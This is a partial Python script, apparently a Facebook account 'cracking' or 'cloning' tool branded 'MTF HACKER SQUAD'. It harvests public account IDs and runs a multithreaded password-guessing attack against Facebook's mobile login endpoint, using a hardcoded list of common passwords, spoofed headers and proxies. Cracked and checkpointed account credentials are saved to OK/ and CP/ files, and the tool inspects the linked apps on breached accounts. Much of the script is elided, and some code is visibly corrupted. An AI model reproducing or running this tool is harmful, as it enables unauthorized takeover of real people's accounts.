...
©••version 69.99••          FELL THE POWER OF MTF HACKER SQUAD   '''             
	AADARSHA(nel(ban, style='green'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             USER NAME : [green]AADARSH[purple] '))
...
def menu(my_name,my_id):
	...
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tUSER NAME [green]%s[purple] '%(my_name)))
	alvino_xy(f'{u}ID  : '+str(my_id))
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold green]           • CHOOSE CLONING MENU • [/bold green]'))
	print('')
	cetak(nel('[bold green] ║01║ CRACK PUBLIC ID\n ║00║ EXIT [bold green]')) 
...
def dump_massal():
	...
	try:
		...
		print('{k}👉OPTION IS NOT THERE REFOLLOW THE STEPS ')
		exit()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold green]         CLONING MENU • [/bold green]'))
	print('') 
	...
	if hu in ['1','01']:
		...
		print('👉TRY AGAIN')
		exit()
	cetak(nel('\t[bold green]             • METHODE LOGIN • [/bold green]'))
	print('') 
...
#	else:
#		taplikasi.append('no')
	pwplus=input('👉PASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)--choose d--( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[green]] ADD PASWORD MXM 6 WORDS\n[[purple]•[green]] EXIMPLE :[green] 556677,786786,123456[purple] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold green]               GAME STRTED SOO WAIT AND SEE😂[bold green]')) 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
	print(f'👉OK {h}IDS{u} FILE: {h}OK/%s {b}'%(okc))
	print(f'👉CP {k}IDS{h} FILR: {k}CP/%s {b}'%(cpc))
	print(f'👉TURN AROPLAN MODE AFTER CLONE IDZ ABOVE {h}1K{u} Idz\n')
	with tgreen(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['fuckyou123','sagarmatha8848','kathmandu123','biratnagar123','nepal000','dharan123','iloveyou','machikney','machikney123','nepal123','freefire','123456,'userdeath','newuser','userchange','learnmore','venom123','ronaldo777','messi10']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}AADARSHA-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_greenirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [green]     😴😭yah cp mampus lu btw moga ijo😭😴 [green]'))
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_greenirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_greenirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [green]     😭 MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR 😭[green]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold green][•] LIST EXPIgreen APPLICATIONS :[/bold green]\n")
...
def cek_apk(session,cookie):
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh there are no expired apps on this account.")
	else:
		for i in range(len(game)):
